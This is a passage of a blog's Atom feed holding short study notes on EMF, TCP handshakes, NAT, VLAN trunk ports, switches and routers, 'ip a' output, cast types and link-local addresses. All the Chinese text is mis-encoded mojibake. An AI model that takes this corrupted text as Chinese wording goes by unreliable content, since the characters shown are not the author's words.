    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://www.bilibili.com/video/BV1VZ4y1V7Zj/?spm_id_from=333.788.recommend_more_video.-1&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ1</a></h1><p><img src="/../img/what_is_emf.png"></p><p>ç”µæ± çš„ä½œç”¨, ç”µæ± ä¸­æœ‰èƒ½é‡, å…¶ç”¨æ¥å°†è´Ÿç”µè·ä»è´Ÿæè¿é€åˆ°æ­£æ. å½“ç”µæ± ä¸­çš„èƒ½é‡è€—å°½, ç”µå­ä¸èƒ½è¿é€åˆ°æ­£æ, ç”µè·¯ä¸­ä¹Ÿå°±æ²¡äº†ç”µæµ.</p><p><img src="/../img/higher_larger_emf.png"></p><p>ç”µåŠ¨åŠ¿è¶Šå¤§, å¯ä»¥çœ‹ä½œå°†ç”µå­æ¬è¿å¾—è¶Šé«˜.</p><p>å¯ä»¥å°†ç”µåŠ¨åŠ¿è§†ä¸ºæ¬è¿ç”µè·çš„èƒ½åŠ›. ä¹Ÿå°±æ˜¯å•ä½ç”µè·åšåŠŸçš„å¤§å°.</p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘ç»œæ‹“æ‰‘å›¾ç¤ºä¾‹</title>
    <link href="/2022/10/31/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9B%BE%E7%A4%BA%E4%BE%8B/"/>
    <url>/2022/10/31/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9B%BE%E7%A4%BA%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/network_topology.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘é¡µåˆ¶ä½œç½‘ç«™-Framer-çš„ä½¿ç”¨</title>
    <link href="/2022/10/30/%E7%BD%91%E9%A1%B5%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99-Framer-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/30/%E7%BD%91%E9%A1%B5%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99-Framer-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Vedio-Tutorial"><a href="#Vedio-Tutorial" class="headerlink" title="Vedio Tutorial"></a>Vedio Tutorial</h1><h2 id="App-Tutorial"><a href="#App-Tutorial" class="headerlink" title="App Tutorial"></a>App Tutorial</h2><p>åˆ©ç”¨ Publish å¯ä»¥é¢„è§ˆ.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP-å’Œ-UDP-åè®®</title>
    <link href="/2022/10/30/TCP-%E5%92%8C-UDP-%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/10/30/TCP-%E5%92%8C-UDP-%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1kV411j7hA/?spm_id_from=333.999.0.0&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ</a></p><h1 id="TCP-åè®®"><a href="#TCP-åè®®" class="headerlink" title="TCP åè®®"></a>TCP åè®®</h1><h2 id="ä¸‰æ¬¡æ¡æ‰‹"><a href="#ä¸‰æ¬¡æ¡æ‰‹" class="headerlink" title="ä¸‰æ¬¡æ¡æ‰‹"></a>ä¸‰æ¬¡æ¡æ‰‹</h2><p>SYN åŒ…, Synchronise, å¯è§†ä¸ºè¯·æ±‚åŒæ­¥.</p><p>å¯¹ç«¯åŒæ„è¿æ¥å›å¤çš„ SYN+ACK åŒ…, ACK å¯è§†ä¸º Acknowledge (æœ‰å‘ŠçŸ¥æ”¶åˆ°çš„æ„æ€).</p><p>æœ€å Client ç«¯å›å¤çš„ ACK åŒ…ä¹Ÿæ˜¯å‘ŠçŸ¥æ”¶åˆ°.</p><p>ç”±äºåœ¨å»ºç«‹è¿æ¥çš„è¿‡ç¨‹ä¸­ç›¸äº’ä¹‹é—´å‘é€äº†ä¸‰ä¸ªæ•°æ®åŒ…, äºæ˜¯ç§°ä¸‰æ¬¡æ¡æ‰‹.</p><p>ä¸‰æ¬¡æ¡æ‰‹æ˜¯ä¸ºäº†è§£å†³ç½‘ç»œä¿¡é“ä¸å¯é çš„é—®é¢˜.</p><p>è‹¥ Server ç«¯æœªæ”¶åˆ°æœ€åçš„ ACK åŒ…, ä¹Ÿå°±ä¸ä¼šå»ºç«‹è¿æ¥.</p><p><img src="/../img/three_handshake.png"></p><h2 id="å››æ¬¡æŒ¥æ‰‹"><a href="#å››æ¬¡æŒ¥æ‰‹" class="headerlink" title="å››æ¬¡æŒ¥æ‰‹"></a>å››æ¬¡æŒ¥æ‰‹</h2><p><img src="/../img/four_hand_wave.png"></p><h2 id="ä¸¢åŒ…é—®é¢˜å’Œä¹±åºé—®é¢˜"><a href="#ä¸¢åŒ…é—®é¢˜å’Œä¹±åºé—®é¢˜" class="headerlink" title="ä¸¢åŒ…é—®é¢˜å’Œä¹±åºé—®é¢˜"></a>ä¸¢åŒ…é—®é¢˜å’Œä¹±åºé—®é¢˜</h2><p>å»ºç«‹å‘é€ç¼“å†²åŒºè§£å†³.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯æ‹“æ‰‘</title>
    <link href="/2022/10/30/%E4%BB%80%E4%B9%88%E6%98%AF%E6%8B%93%E6%89%91/"/>
    <url>/2022/10/30/%E4%BB%80%E4%B9%88%E6%98%AF%E6%8B%93%E6%89%91/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><a href="https://baike.baidu.com/item/%E6%8B%93%E6%89%91/573536">å‚è€ƒ</a></h1><p>æ‹“æ‰‘è¿™ä¸ªè¯å¹¶ä¸æ˜¯ä¸­æ–‡ä¸­çš„åŸæœ‰è¯æ±‡, è€Œæ˜¯ä» Topology ç›´æ¥éŸ³è¯‘è€Œæ¥.</p><p>æ‹“æ‰‘æŒ‡, å‡ ä½•å›¾å½¢æˆ–ç©ºé—´åœ¨è¿ç»­æ”¹å˜å½¢çŠ¶åæŸäº›æ€§è´¨ä»»ä¿æŒä¸å˜.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-NAT-çš„ä¼˜ç¼ºç‚¹</title>
    <link href="/2022/10/30/%E5%85%B3%E4%BA%8E-NAT-%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/"/>
    <url>/2022/10/30/%E5%85%B3%E4%BA%8E-NAT-%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://blog.csdn.net/weixin_29086203/article/details/112819041">å‚è€ƒ1</a></h1><p>ä¼˜ç‚¹:<br>å†…éƒ¨ä¸»æœºå…±äº«ä¸€ä¸ªå…±æœ‰ IP åœ°å€, èŠ‚çœäº†åœ°å€.</p><p>ä¿è¯äº†ç½‘ç»œå®‰å…¨.</p><p>ç¼ºç‚¹:<br>å½±å“æ€§èƒ½. è½¬æ¢ IP åœ°å€éœ€è¦æ—¶é—´.</p><p>ä¸€äº›å®‰å…¨åº”ç”¨ç¨‹åºä¼šå› ä¸ºæº IP åœ°å€æ”¹å˜è€Œå¤±è´¥.</p><p>å¢åŠ  IP è¿½è¸ªçš„éš¾åº¦.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åŒä¸€ä¸ªäº¤æ¢æœºä¸Šçš„ä¸åŒ-VLAN-ä¹‹é—´é€šä¿¡</title>
    <link href="/2022/10/30/%E5%90%8C%E4%B8%80%E4%B8%AA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E4%B8%8A%E7%9A%84%E4%B8%8D%E5%90%8C-VLAN-%E4%B9%8B%E9%97%B4%E9%80%9A%E4%BF%A1/"/>
    <url>/2022/10/30/%E5%90%8C%E4%B8%80%E4%B8%AA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E4%B8%8A%E7%9A%84%E4%B8%8D%E5%90%8C-VLAN-%E4%B9%8B%E9%97%B4%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.zylxyl.com/archives/2020/09/07/1068.html">å‚è€ƒ</a></p><p>ä¸åŒçš„ VLAN å°±æ˜¯ä¸åŒçš„ç½‘æ®µ.</p><p>åŒä¸€ä¸ª VLAN ä¸­çš„è®¾å¤‡å¯ä»¥é€šè¿‡æ•°æ®é“¾è·¯å±‚é€šä¿¡ (ç”¨ MAC åœ°å€æ¥å®šä½).</p><p>ä¸åŒ VLAN ä¹‹é—´çš„è®¾å¤‡é€šä¿¡éœ€è¦å»ºç«‹åœ¨ç½‘ç»œå±‚çš„åŸºç¡€ä¸Š (é€šè¿‡ IP å®šä½)</p><p>é€šè¿‡å•è‡‚è·¯ç”± (è·¯ç”±å™¨åªä½¿ç”¨ä¸€ä¸ªç«¯å£è¿æ¥åˆ°äº¤æ¢ç½‘ç»œä¸­, å¯èƒ½ç”±äºåªæœ‰ä¸€æ¡çº¿, æ‰€ä»¥æ‰ç§°ä¸ºå•è‡‚)<br><img src="/../img/single_arm_route.png"></p><p>å¤§è‡´æµç¨‹ (ç›´æ¥æ‘˜å½•):</p><blockquote><p>å½“ VLAN10 ä¸­çš„ä¸»æœº A å‘ VLAN20 ä¸­çš„ä¸»æœº B å‘é€ä¿¡æ¯æ—¶ï¼Œäº¤æ¢æœºç«¯å£ 1 æ”¶åˆ°ä¸»æœº A å‘å‡ºçš„æ•°æ®å¸§ï¼ŒæŸ¥è¯¢è‡ªå·±çš„ MAC åœ°å€è¡¨ï¼Œç„¶åå°†æ•°æ®å¸§ä» Trunk ç«¯å£ 4 è½¬å‘å‡ºå»ï¼Œå¹¶ä¸ºæ•°æ®å¸§æ·»åŠ  VLAN ID&#x3D;10 çš„æ ‡ç­¾ã€‚è·¯ç”±å™¨æ”¶åˆ°æ•°æ®å¸§åï¼Œå‘ç°å®ƒå±äº VLAN10ï¼Œå› æ­¤æŠŠå®ƒäº¤ç»™è´Ÿè´£VLAN10 çš„å­æ¥å£ï¼Œè¯¥æ¥å£åˆ¤æ–­æ•°æ®å¸§åº”å‘å¾€è´Ÿè´£ VLAN20 çš„å­æ¥å£ã€‚è´Ÿè´£ VLAN20 çš„å­æ¥å£å†ä¸ºæ•°æ®å¸§æ·»åŠ  VLAN ID&#x3D;20 çš„æ ‡ç­¾å¹¶å‘å›ç»™äº¤æ¢æœºã€‚äº¤æ¢æœºæ”¶åˆ°è¯¥æ•°æ®åæŸ¥è¯¢ MAC åœ°å€è¡¨ï¼Œå»æ‰æ•°æ®å¸§ä¸­çš„ VLAN æ ‡ç­¾ï¼Œå°†å®ƒä»ç«¯å£ 2 å‘é€ç»™ä¸»æœº Bã€‚è¿™æ ·ä¸»æœº B å°±æ¥æ”¶åˆ°äº†ä¸»æœºAå‘ç»™å®ƒçš„ä¿¡æ¯ã€‚å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡è·¯ç”±å™¨è¿›è¡ŒVLANä¹‹é—´çš„é€šä¿¡æ—¶ï¼Œä¿¡æ¯ä¼ è¾“ç»è¿‡ä»¥ä¸‹è¿‡ç¨‹ï¼šå‘é€è€… -&gt; äº¤æ¢æœº -&gt; è·¯ç”±å™¨ -&gt; äº¤æ¢æœº -&gt; æ¥æ”¶è€…ï¼Œå³ä½¿é€šä¿¡çš„åŒæ–¹å¤„åœ¨åŒä¸€å°äº¤æ¢æœºä¸Šï¼Œä¹Ÿå¿…é¡»ç»è¿‡è¿™æ ·çš„è¿‡ç¨‹</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>äº¤æ¢æœºå’Œè·¯ç”±å™¨çš„åŒºåˆ«</title>
    <link href="/2022/10/30/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%92%8C%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/10/30/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%92%8C%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://www.bilibili.com/video/BV1fU4y1t7Ju/?spm_id_from=333.788.recommend_more_video.3&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ1</a></h1><h2 id="äº¤æ¢æœº"><a href="#äº¤æ¢æœº" class="headerlink" title="äº¤æ¢æœº"></a>äº¤æ¢æœº</h2><p>äº¤æ¢æœºä¸­æœ‰ MAC åœ°å€è¡¨, åæ˜ ç«¯å£å’Œ MAC åœ°å€çš„å…³ç³».<br><img src="/../img/switch_port_mac.png"></p><p>äº¤æ¢æœºåªå…³å¿ƒ MAC åœ°å€, ä¸å…³ç³» IP åœ°å€. MAC åœ°å€å¤„äºæ•°æ®é“¾è·¯å±‚. å…¶ä½äº OSI æ¨¡å‹çš„ç¬¬äºŒå±‚, å› æ­¤äº¤æ¢æœºä¹Ÿè¢«æˆä¸ºäºŒå±‚è®¾å¤‡.</p><h2 id="è·¯ç”±å™¨"><a href="#è·¯ç”±å™¨" class="headerlink" title="è·¯ç”±å™¨"></a>è·¯ç”±å™¨</h2><p>è·¯ç”±å™¨æœ‰ä¸¤ç§ç«¯å£:<br><img src="/../img/router_port_function.png"></p><p>è‹¥å¿½ç•¥è·¯ç”±å™¨çš„ WAN å£, è·¯ç”±å™¨å°±æ˜¯ä¸€ä¸ªäº¤æ¢æœº.</p><p>LAN å£æ¥å†…ç½‘, WLAN å£æ¥äº’è”ç½‘.<br><img src="/../img/router_two_ports.png"></p><p>TCP&#x2F;IP åè®®è§„å®š, ä¸åŒå­ç½‘ä¹‹é—´ä¸èƒ½ç›´æ¥é€šä¿¡, éœ€è¦å€ŸåŠ©ç½‘å…³.</p><p><img src="/../img/router_gateway.png"></p><p>æ­¤æ—¶, è·¯ç”±å™¨å……å½“ç½‘å…³çš„è§’è‰².</p><p>è·¯ç”±å™¨ä¸Šæœ‰ä¸¤å¼ ç½‘å¡, ä¸€å¼ æœ‰åˆ†é…å†…ç½‘ IP, ç”¨äºå’Œå†…ç½‘è®¾å¤‡æ²Ÿé€š, ä¸€å¼ åˆ†é…å…¬ç½‘ IP, å’Œäº’è”ç½‘æ²Ÿé€š.</p><p><img src="/../img/two_cards_on_router.png"></p><p>å…³äº snat:<br><img src="/../img/about_snat.png"></p><p>åœ¨æ•°æ®åŒ…è¿›å…¥äº’è”ç½‘æ—¶, å°†æº IP (å†…ç½‘ IP) è½¬æ¢ä¸ºè·¯ç”±å™¨çš„å…¬ç½‘ IP.</p><p>åœ¨æ•°æ®åŒ…å›ä¼ æ—¶, å°†ç›®æ ‡ IP (è·¯ç”±å™¨çš„å…¬ç½‘ IP) è½¬æ¢ä¸ºå†…ç½‘è®¡ç®—æœºçš„å†…ç½‘ IP.</p><p>åŒæ—¶ä¿®æ”¹æº IP å’Œæºç«¯å£æ¥å®šä½æ•°æ®åŒ…ä»å“ªé‡Œå‘å‡º:<br><img src="/../img/back_data.png"></p><p>æ— ç«¯å£ä¿¡æ¯çš„ä¼ è¾“åè®®ç”¨å…¶ä»–æ ‡è®°å…³è”:<br><img src="/../img/other_flag_to_connect.png"></p><p>DNAT ä¸ºä¿®æ”¹ç›®çš„ IP.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>VLAN-æ¦‚å¿µä»¥åŠ-Trunk-å£æ¦‚å¿µ</title>
    <link href="/2022/10/30/VLAN-%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A-Trunk-%E5%8F%A3%E6%A6%82%E5%BF%B5/"/>
    <url>/2022/10/30/VLAN-%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A-Trunk-%E5%8F%A3%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://cloud.tencent.com/developer/article/1741191">å‚è€ƒ1</a></h1><h1 id="å‚è€ƒ2"><a href="#å‚è€ƒ2" class="headerlink" title="å‚è€ƒ2"></a><a href="https://www.cnblogs.com/weiyikang/p/4945914.html">å‚è€ƒ2</a></h1><p>ä»¥å¤ªç½‘ç«¯å£æœ‰ä¸¤ç§é“¾è·¯ç±»å‹:</p><ul><li>Access</li><li>Trunk</li></ul><p>Access ç±»å‹ç«¯å£åªèƒ½å…è®¸ä¸€ä¸ª VLAN çš„æŠ¥æ–‡é€šè¿‡, ä¸€èˆ¬ç”¨äºè¿æ¥è®¡ç®—æœºçš„ç«¯å£. (ä¹Ÿå°±æ˜¯è¯´, å¯ä»¥æ¥å—æ¥è‡ªä¸€ä¸ª VLAN çš„æ•°æ®)</p><p>Trunk ç±»å‹çš„ç«¯å£å¯ä»¥å…è®¸å¤šä¸ª VLAN é€šè¿‡. ä¸€èˆ¬ç”¨äºäº¤æ¢æœºä¹‹é—´è¿æ¥çš„ç«¯å£. (ä¹Ÿå°±æ˜¯è¯´èƒ½å¤Ÿæ¥å—æ¥è‡ªå¤šä¸ª VLAN çš„æ•°æ®).</p><h1 id="å‚è€ƒ3"><a href="#å‚è€ƒ3" class="headerlink" title="å‚è€ƒ3"></a><a href="https://www.bilibili.com/video/BV1wb4y1R7XL/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ3</a></h1><p>ä¸ºä»€ä¹ˆè¦ç”¨åˆ° trunk å£ ?</p><p>Access å£åªå…è®¸æ¥è‡ªä¸€ä¸ª VLAN çš„æ•°æ®, è€Œäº¤æ¢æœºä¸äº¤æ¢æœºè¿›è¡Œæ•°æ®äº¤æ¢æ—¶, ä¼šæœ‰å¤šä¸ª VLAN çš„æ•°æ®åœ¨ä¼ è¾“ (ä¸€ä¸ªäº¤æ¢æœºä¸Šæœ‰å¤šä¸ª VLAN çš„å£, æ¯”å¦‚æœ‰ä¸‰ä¸ª, é‚£ä¹ˆå°†è¿™ä¸ªäº¤æ¢æœºçš„æ•°æ®éƒ½æµå‘å¦ä¸€ä¸ª, é‚£ä¹ˆå°±æ˜¯ä¸‰ä¸ª VLAN çš„æ•°æ®), å› æ­¤éœ€è¦ä¸€ä¸ªå£æ¥æ¥æ”¶åŒ…å«å¤š VLAN æ•°æ®.</p><p>trunk æœ¬æ„ä¸ºæ ‘å¹², å¯ä»¥è¿™æ ·çœ‹:<br><img src="/../img/why_trunk.png"></p><p>å››ä¸ª VLAN çš„æ•°æ®æ±‡åˆ, å°±åƒæ ‘æå’Œæ ‘å¹².</p><p>åœ¨æ•°æ®å¸§ä¸­æº MAC å­—æ®µä¹‹åæ’å…¥ tag ç”¨æ¥è¡¨ç¤ºè¿™ä¸ªæ•°æ®æ˜¯æ¥è‡ªå“ªä¸€ä¸ª VLAN. VLAN ID ä¸º 12 ä½æ•°æ®, è¡¨æ˜å…±æœ‰ 4096 ä¸ª VLAN å¯åˆ†é…. (ä¸º 0~4095, ä¸” 0 å’Œ 4095 ä¿ç•™, ç”¨æˆ·ä¸èƒ½ä½¿ç”¨)<br><img src="/../img/type_vlan.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è®¿é—®ä¸€ä¸ªç½‘å€æ‰€ç»å†çš„æ­¥éª¤</title>
    <link href="/2022/10/30/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E5%9D%80%E6%89%80%E7%BB%8F%E5%8E%86%E7%9A%84%E6%AD%A5%E9%AA%A4/"/>
    <url>/2022/10/30/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E5%9D%80%E6%89%80%E7%BB%8F%E5%8E%86%E7%9A%84%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/twt936457991/article/details/89587287">å‚è€ƒ1</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-ip-a-è¾“å‡ºçš„è§£æ</title>
    <link href="/2022/10/30/%E5%85%B3%E4%BA%8E-ip-a-%E8%BE%93%E5%87%BA%E7%9A%84%E8%A7%A3%E6%9E%90/"/>
    <url>/2022/10/30/%E5%85%B3%E4%BA%8E-ip-a-%E8%BE%93%E5%87%BA%E7%9A%84%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://halysl.github.io/2020/01/10/ip-%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90/">å‚è€ƒ1</a></h1><p><code>ip a</code> æ˜¯ <code>ip addr</code> çš„ç®€å†™.</p><p>å†…å®¹:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BROADCAST </span>  è¯¥æ¥å£æ”¯æŒå¹¿æ’­<br><span class="hljs-keyword">MULTICAST </span>  è¯¥æ¥å£æ”¯æŒå¤šæ’­<br>UP          ç½‘ç»œæ¥å£å·²å¯ç”¨<br>LOWER_UP    ç½‘ç»œç”µç¼†å·²æ’å…¥ï¼Œè®¾å¤‡å·²è¿æ¥è‡³ç½‘ç»œ<br></code></pre></td></tr></table></figure><p>ä»¥åŠ:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mtu</span> <span class="hljs-number">1500</span>                                    æœ€å¤§ä¼ è¾“å•ä½ï¼ˆæ•°æ®åŒ…å¤§å°ï¼‰ä¸º <span class="hljs-number">1</span>,<span class="hljs-number">500</span> å­—èŠ‚<br><span class="hljs-attribute">qdisc</span> pfifo_fast                            ç”¨äºæ•°æ®åŒ…æ’é˜Ÿ<br><span class="hljs-attribute">state</span> UP                                    ç½‘ç»œæ¥å£å·²å¯ç”¨ï¼ˆé‡è¦ï¼‰<br><span class="hljs-attribute">group</span> default                               æ¥å£ç»„<br><span class="hljs-attribute">qlen</span> <span class="hljs-number">1000</span>                                   ä¼ è¾“é˜Ÿåˆ—é•¿åº¦<br><span class="hljs-attribute">link</span>/ether <span class="hljs-number">00</span>:<span class="hljs-number">1</span>e:<span class="hljs-number">4</span>f:c8:<span class="hljs-number">43</span>:fc                æ¥å£çš„ MACï¼ˆç¡¬ä»¶ï¼‰åœ°å€<br><span class="hljs-attribute">brd</span> ff:ff:ff:ff:ff:ff                       å¹¿æ’­åœ°å€<br><span class="hljs-attribute">inet</span> <span class="hljs-number">192.168.0.24</span>/<span class="hljs-number">24</span>                        IPv4 åœ°å€ï¼ˆé‡è¦ï¼‰<br><span class="hljs-attribute">brd</span> <span class="hljs-number">192.168.0.255</span>                           å¹¿æ’­åœ°å€<br><span class="hljs-attribute">scope</span> global                                å…¨å±€æœ‰æ•ˆ<br><span class="hljs-attribute">dynamic</span> enp0s25                             åœ°å€æ˜¯åŠ¨æ€åˆ†é…çš„ï¼ˆé‡è¦ï¼‰<br><span class="hljs-attribute">valid_lft</span> <span class="hljs-number">80866</span>sec                          IPv4 åœ°å€çš„æœ‰æ•ˆä½¿ç”¨æœŸé™<br><span class="hljs-attribute">preferred_lft</span> <span class="hljs-number">80866</span>sec                      IPv4 åœ°å€çš„é¦–é€‰ç”Ÿå­˜æœŸ<br><span class="hljs-attribute">inet6</span> fe80::<span class="hljs-number">2</span>c8e:<span class="hljs-number">1</span>de0:a862:<span class="hljs-number">14</span>fd/<span class="hljs-number">64</span>          IPv6 åœ°å€<br><span class="hljs-attribute">scope</span> link                                  ä»…åœ¨æ­¤è®¾å¤‡ä¸Šæœ‰æ•ˆ<br><span class="hljs-attribute">valid_lft</span> forever                           IPv6 åœ°å€çš„æœ‰æ•ˆä½¿ç”¨æœŸé™<br><span class="hljs-attribute">preferred_lft</span> forever                       IPv6 åœ°å€çš„é¦–é€‰ç”Ÿå­˜æœŸ<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ <code>man ip-address</code> è¿˜æœ‰éƒ¨åˆ†ä¿¡æ¯.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Unicast,Multicast,Anycast,Broadcast-çš„å†…å®¹å’Œç”¨é€”</title>
    <link href="/2022/10/30/Unicast,Multicast,Anycast,Broadcast-%E7%9A%84%E5%86%85%E5%AE%B9%E5%92%8C%E7%94%A8%E9%80%94/"/>
    <url>/2022/10/30/Unicast,Multicast,Anycast,Broadcast-%E7%9A%84%E5%86%85%E5%AE%B9%E5%92%8C%E7%94%A8%E9%80%94/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://colobu.com/2014/10/21/udp-and-unicast-multicast-broadcast-anycast/">å‚è€ƒ1</a></h1><p>Unicast å³å•æ’­. ç›®çš„åœ°å€ä¸ºå•ä¸€ç›®æ ‡. é€šå¸¸ä½¿ç”¨çš„ç½‘ç»œåè®®æˆ–æœåŠ¡å¤§å¤šé‡‡ç”¨å•æ’­ä¼ è¾“, å¦‚ TCP.</p><p>Multicast å³å¤šæ’­. ä¿¡æ¯ä¼ é€’ç»™å¤šä¸ªåœ°å€. è¾ƒé«˜æ•ˆ.</p><p>Anycast å³ä»»æ’­. ç”±è·¯ç”±å†³å®šé€åˆ° â€œæœ€è¿‘â€ æˆ– â€œæœ€å¥½â€ çš„ç›®çš„åœ°.</p><p>Broadcast å³å¹¿æ’­. ç›®çš„åœ°å€ä¸ºç‰©ç†é“¾è·¯ä¸­çš„æ‰€æœ‰è®¾å¤‡.</p><p>ä½¿ç”¨ <code>ifconfig</code> å‘½ä»¤, å…¶ä¼šæœ‰ <code>UP BROADCAST RUNNING MULTICAST</code> ç­‰ä¿¡æ¯.</p><h2 id="ç»„æ’­åœ°å€"><a href="#ç»„æ’­åœ°å€" class="headerlink" title="ç»„æ’­åœ°å€"></a>ç»„æ’­åœ°å€</h2><p>å®˜æ–¹åˆ†é…çš„ä¸ºæ°¸ä¹…ç»„æ’­ç»„. å…¶ IP ä¸å˜, å†…éƒ¨çš„æˆå‘˜å¯ä»¥æ”¹å˜.</p><h2 id="å¹¿æ’­åœ°å€"><a href="#å¹¿æ’­åœ°å€" class="headerlink" title="å¹¿æ’­åœ°å€"></a>å¹¿æ’­åœ°å€</h2><p>Broadcast Address, åœ¨ä½¿ç”¨ TCP&#x2F;IP åè®®çš„ç½‘ç»œä¸­, ä¸»æœºæ ‡è¯†æ®µ host ID å…¨ä¸º 1 çš„ IP åœ°å€ä¸ºå¹¿æ’­åœ°å€. </p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-link-local-åœ°å€</title>
    <link href="/2022/10/30/%E4%BB%80%E4%B9%88%E6%98%AF-link-local-%E5%9C%B0%E5%9D%80/"/>
    <url>/2022/10/30/%E4%BB%80%E4%B9%88%E6%98%AF-link-local-%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p><a href="https://baike.baidu.com/item/%E9%93%BE%E8%B7%AF%E6%9C%AC%E5%9C%B0%E5%9C%B0%E5%9D%80/22828281">å‚è€ƒ</a></p><p>Link-local address ä»…ä¾›äºåœ¨ç½‘æ®µ, æˆ–å¹¿æ’­åŸŸä¸­çš„ä¸»æœºç›¸äº’é€šä¿¡ä½¿ç”¨.</p><p>IPv4 ä¸º 169.254.0.0&#x2F;16</p><p>IPv6 ä¸º fe80::&#x2F;10</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SLAAC-ä¸‹å‘-IPv6-çš„æµç¨‹</title>
    <link href="/2022/10/30/SLAAC-%E4%B8%8B%E5%8F%91-IPv6-%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
    <url>/2022/10/30/SLAAC-%E4%B8%8B%E5%8F%91-IPv6-%E7%9A%84%E6%B5%81%E7%A8%8B/</url>
    
